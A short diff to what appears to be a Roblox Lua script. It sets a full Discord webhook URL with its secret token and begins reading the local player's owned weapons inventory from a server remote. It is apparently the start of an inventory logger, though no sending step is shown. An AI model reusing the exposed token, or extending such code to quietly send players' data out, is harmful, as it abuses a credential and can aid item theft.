@@ -1,4 +1,4 @@
-local url = ""
+local url = "https://discord.com/api/webhooks/1268196549926850641/CmLO0g3BMouHEz6QA85HhC_LPnJ1ry048o_gVZ28oh9_1gBYw_iWXEILRgAoUyX072YM"
 
 t = {}
 for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
